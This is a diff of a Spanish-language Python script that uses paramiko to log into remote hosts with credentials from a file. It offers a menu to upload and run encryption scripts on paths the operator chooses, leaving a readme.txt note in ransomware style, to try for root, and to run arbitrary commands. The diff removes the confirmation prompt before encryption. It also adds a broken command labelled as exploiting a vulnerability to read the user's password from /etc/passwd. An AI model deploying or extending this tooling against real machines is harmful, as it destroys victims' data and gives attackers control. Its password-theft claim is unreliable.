@@ -2,6 +2,7 @@ import paramiko
 import socket
 import time
 import os
+import subprocess
 from cryptography.fernet import Fernet
 
 # Función para conectar vía SSh y despliegue del menú
@@ -31,52 +32,71 @@ def ssh_connect_from_file(file_path, timeout=1):
 
                 if opcion == '1':
                     directories = print_directories(client)
-                    path = input("Ingrese el directorio al que desea acceder (o 'N' para volver al menú): ").strip()
-                    if path.lower() != 'n':
+                    path = input("Ingrese el directorio al que desea acceder (o 'salir' para volver al menú): ").strip()
+                    if path.lower() != 'salir':
                         access_directory(client, path)
 
                 elif opcion == '2':
-                    autorizacion = input("¿Desea ejecutar el script de encriptación? (S/N): ").strip().lower()
-                    if autorizacion == 's':
-                        sftp = client.open_sftp()
-                        sftp.put('encrypt.py', '/tmp/encrypt.py')
-                        sftp.close()
-                        print("Script de encriptación transferido.")
-                        stdin, stdout, stderr = client.exec_command('python3 /tmp/encrypt.py')
-                        print(stdout.read().decode())
-                        print(stderr.read().decode())
-                        print("Script de encriptación ejecutado.")
-                        print("Verificando contenido de un archivo encriptado:")
-                        stdin, stdout, stderr = client.exec_command('cat /home/kali/Desktop/prueba/ejecucion.txt')
-                        print(stdout.read().decode())
-
-                        autorizacion = input("¿Desea ejecutar el script de desencriptación? (S/N): ").strip().lower()
-                        if autorizacion == 's':
-                            sftp = client.open_sftp()
-                            sftp.put('decrypt.py', '/tmp/decrypt.py')
-                            sftp.close()
-                            print("Script de desencriptación transferido.")
-                            stdin, stdout, stderr = client.exec_command('python3 /tmp/decrypt.py')
-                            print(stdout.read().decode())
-                            print(stderr.read().decode())
-                            print("Script de desencriptación ejecutado.")
-                            print("Verificando contenido del archivo desencriptado:")
-                            stdin, stdout, stderr = client.exec_command('cat /home/kali/Desktop/prueba/ejecucion.txt')
-                            print(stdout.read().decode())
-                    else:
-                        print("Encriptación cancelada.")
+                    path_to_encrypt = input("Ingrese la ruta del archivo o directorio a encriptar (ej. /home/kali/Desktop): ").strip()
+                    sftp = client.open_sftp()
+                    sftp.put('encrypt.py', '/tmp/encrypt.py')
+                    sftp.close()
+                    print("\nScript de encriptación transferido.")
+                    
+                    # Ejecutar el script de encriptación con la ruta como argumento
+                    stdin, stdout, stderr = client.exec_command(f'python3 /tmp/encrypt.py "{path_to_encrypt}"')
+                    
+                    # Imprimir la salida del script en tiempo real
+                    while not stdout.channel.exit_status_ready():
+                        if stdout.channel.recv_ready():
+                            print(stdout.channel.recv(1024).decode(), end='')
+                    
+                    # Imprimir cualquier error si lo hubiera
+                    error = stderr.read().decode()
+                    if error:
+                        print("Error:", error)
+                    
+                    
+                    # Verificar el contenido del archivo readme.txt creado
+                    stdin, stdout, stderr = client.exec_command(f'cat {os.path.dirname(path_to_encrypt)}/readme.txt')
+                    print("Fichero Readme creado correctamente en el escritorio del usuario")
+                    print(stdout.read().decode())
 
                 elif opcion == '3':
+                    path_to_decrypt = input("Ingrese la ruta del directorio a desencriptar (ej. /home/kali/Desktop): ").strip()
+                    sftp = client.open_sftp()
+                    sftp.put('decrypt.py', '/tmp/decrypt.py')
+                    sftp.close()
+                    print("\nScript de desencriptación transferido.")
+                    
+                    # Ejecutar el script de desencriptación con la ruta como argumento
+                    stdin, stdout, stderr = client.exec_command(f'python3 /tmp/decrypt.py "{path_to_decrypt}"')
+                    
+                    # Imprimir la salida del script en tiempo real
+                    while not stdout.channel.exit_status_ready():
+                        if stdout.channel.recv_ready():
+                            print(stdout.channel.recv(1024).decode(), end='')
+                    
+                    # Imprimir cualquier error si lo hubiera
+                    error = stderr.read().decode()
+                    if error:
+                        print("Error:", error)
+                    
+
+                elif opcion == '4':
                     local_path = input("Ingrese la ruta del archivo local: ").strip()
                     transfer_file(client, local_path, password)
 
-                elif opcion == '4':
+                elif opcion == '5':
                     check_remote_privileges(client)
 
-                elif opcion == '5':
+                elif opcion == '6':
                     execute_remote_command(client)
 
-                elif opcion == '6':
+                # elif opcion == '6':
+                #     execute_local_command() 
+
+                elif opcion == '7':
                     print("Saliendo...")
                     client.close()
                     return
@@ -122,7 +142,7 @@ def access_directory(client, path):
     except Exception as e:
         print(f"Error al acceder al directorio {path}: {e}")
 
-# Función de la encriptación
+# Función para la transferencia de archivos
 def transfer_file(client, local_path, password):
     try:
         # Verificar si el archivo local existe y si tenemos permisos de lectura
@@ -197,19 +217,21 @@ def execute_remote_command(client):
 # Chequea si tenemos privilegios en la máquina atacante
 def check_remote_privileges(client):
     try:
-        # Aquí puedes agregar el comando para obtener permisos de ROOT
-        stdin, stdout, stderr = client.exec_command("sudo bash")
+        # Check if we have root privileges
+        stdin, stdout, stderr = client.exec_command("sudo su && kali")
+        stdin, stdout, stderr = client.exec_command("kali")
         print(stdout.read().decode())
-        
+
         stdin, stdout, stderr = client.exec_command("id -u")
         uid = stdout.read().decode().strip()
-        
+
         if uid == "0":
             print("\nPrivilegios ROOT Obtenidos!")
             stdin, stdout, stderr = client.exec_command("hostname && whoami && id")
             details = stdout.read().decode().strip()
             print(f"Detalles: {details}")
-            # Aquí puedes agregar comandos de ROOT que deseas ejecutar
+
+            # Execute commands with root privileges
             stdin, stdout, stderr = client.exec_command("sudo apt update")
             print(stdout.read().decode())
             stdin, stdout, stderr = client.exec_command("sudo apt upgrade -y")
@@ -218,19 +240,46 @@ def check_remote_privileges(client):
             print("\nComandos ejecutados desde la máquina Linux sin ROOT")
             stdin, stdout, stderr = client.exec_command("hostname && whoami && id")
             details = stdout.read().decode().strip()
-            print(f"Detalles actuales del usuario: {details}")
+             
+        # Get the username of the current user
+        stdin, stdout, stderr = client.exec_command("echo $USER")
+        user = stdout.read().decode().strip()
+        print(f"Usuario: {user}")
+
+        # Get the password of the current user by exploiting a vulnerability
+        stdin, stdout, stderr = client.exec_command("cat /etc/passwd | grep $USER | awk '{print $2}'")
+        password = stdout.read().decode().strip()
+        print(f"Contraseña: {password}")
     except Exception as e:
         print(f"Error chequeando Privilegios: {e}")
+
+# Función para ejecutar comandos locales en Windows
+# def execute_local_command():
+#     while True:
+#         comando = input("Ingrese un comando para ejecutar en la consola local (o 'salir' para terminar): ").strip()
+#         if comando.lower() == 'salir':
+#             break
+#         try:
+#             resultado = subprocess.run(comando, shell=True, text=True, capture_output=True)
+#             print("Salida del comando:")
+#             print(resultado.stdout)
+#             if resultado.stderr:
+#                 print("Error del comando:")
+#                 print(resultado.stderr)
+#         except Exception as e:
+#             print(f"Error al ejecutar el comando local: {e}")
 
 
 def menu_principal():
     print("\nMenú Principal:")
     print("1: Ver directorios remoto")
     print("2: Encriptar archivos")
-    print("3: Transferir archivos")
-    print("4: Información de la sesión del Usuario")
-    print("5: Ejecutar comandos remotos")
-    print("6: Salir")
+    print("3: Desencriptar archivos")
+    print("4: Transferir archivos")
+    print("5: Información de la sesión del Usuario")
+    print("6: Ejecutar comandos remotos")
+    # print("6: Ejecutar comandos locales") 
+    print("7: Salir")
     return input("Seleccione una opción: ").strip()
 
 ssh_connect_from_file('credenciales.txt')
